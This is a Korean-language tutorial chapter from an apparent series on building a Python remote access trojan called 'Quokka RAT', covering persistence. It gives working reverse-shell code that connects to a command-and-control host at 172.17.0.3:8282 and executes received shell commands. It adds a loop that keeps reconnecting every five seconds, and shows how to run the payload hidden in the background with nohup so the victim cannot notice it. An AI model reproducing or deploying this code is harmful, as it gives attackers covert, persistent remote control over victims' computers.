# Quokka RAT : 지속성(Persistance)

<aside>
⚠️ author : 전재호(agamtt) 2024-03-17

</aside>

# 지속성(Persistance)

우리가 만든 악성코드는 희생자의 python 프로그램이 종료되면 해커가 다시 접근할 방법이 없습니다.
따라서 해커는 여러가지 방법으로 언제든 악성코드를 실행할 수 있도록 방법을 취합니다.

시작프로그램에 등록해서 컴퓨터가 꺼졌다 켜질때마다 악성코드가 실행되게 하는 등의 다양한 방법으로 언제든 접속할 수 있도록 합니다.

이러한 “악성 행위가 끊기지 않도록 방지하는” 해킹기술을 Persistance 라고 부릅니다.

# 폴링(Polling)

폴링은 컴퓨터공학에서, “상태를 주기적으로 검사하는 것”을 말합니다.

우리의 악성코드는, 서버에서 소켓을 Ctrl+C 로 종료하면 악성코드도 종료되니, 계속 해커가 신경써야하니 불편합니다.

Python 반복문과 Try Except 를 이용하여, 서버가 연결을 끊어도, 계속 연결을 요청하도록 Polling 기능을 추가해봅시다.

우리의 페이로드는 아래와 같습니다.

```python
import socket
import subprocess
h="172.17.0.3"
p=8282
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((h,p))

while True:
    c=s.recv(1024).decode()
    output=subprocess.run(c,shell=True,stdout=subprocess.PIPE,text=True)
    result=output.stdout
    if(result==''):
        s.send("suc".encode())
    else:
        s.send(result.encode())
```

이것을 이렇게 수정합니다.

- 만일 서버의 연결이 끊기면, 소켓이 파괴되면서 오류를 발생시킵니다.
    - try except 를 사용하면 오류가 발생했을 때, python 을 종료시키는 것이 아니라 오류를 알아서 처리하도록 할 수 있습니다.
    - except 에 time.sleep(5) 를 넣어, 프로그램을 종료시키지말고 5초 대기하도록 합니다.
    - 5초가 지나면 다시 s.connect() 를 시도합니다.

```bash
import socket
import subprocess
import time
h="172.17.0.3"
p=8282

while True:
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((h,p))
        while True:
            c=s.recv(1024).decode()
            output=subprocess.run(c,shell=True,stdout=subprocess.PIPE,text=True)
            result=output.stdout
            if(result==''):
                s.send("suc".encode())
            else:
                s.send(result.encode())
    except Exception as e:
        time.sleep(5)
```

이제 해커가 C2 서버에서 연결을 끊어도, 악성코드는 5초에 한번씩 해커의 C2 서버를 찾으며 종료되지 않고 생존신호를 보냅니다.

![Untitled](Untitled%20603.png)

그러나 여전히 john 이 Ctrl + C 등으로 파이썬 악성프로그램을 종료시킬 수 있습니다. 어쩌면 좋을까요?

(john 이 악성 프로그램을 발견하고 꺼버리면, C2 서버의 연결도 끊긴다.)

![Untitled](Untitled%20604.png)

이럴때는 악성프로그램이 실행중이라는 사실을 숨겨야합니다.

거기엔 다양한 방법이 있습니다. (다른 프로그램에 숨는다던지 등)

제일 쉬운 방법인 백그라운드 실행 방법을 알아봅시다.

# 리눅스 백그라운드 실행

리눅스에는 백그라운드 실행 기능이 있습니다.

- & 를 명령어 맨 뒤에 붙이면 그 명령어는 백그라운드에서 실행됩니다.
- nohup 을 맨 앞에 붙이면, 유저가 로그아웃해도 실행됩니다.

```bash
nohup python3 payload.py &
```

이제 john 은 터미널에서 악성코드가 실행중인지 전혀 알 수가 없습니다. john 이 모르는 사이에 hacker는 자유롭게 john의 컴퓨터를 사용하고, 원할 때 접속합니다.

![Untitled](Untitled%20605.png)

이렇게 백그라운드로 실행한 프로그램은 ps 명령어로 확인한 후, pid 를 입력해서 수동으로 종료시켜야합니다. 전보다 우리의 악성코드가 더 안전해졌습니다.

 

![Untitled](Untitled%20606.png)

![Untitled](Untitled%20607.png)

계속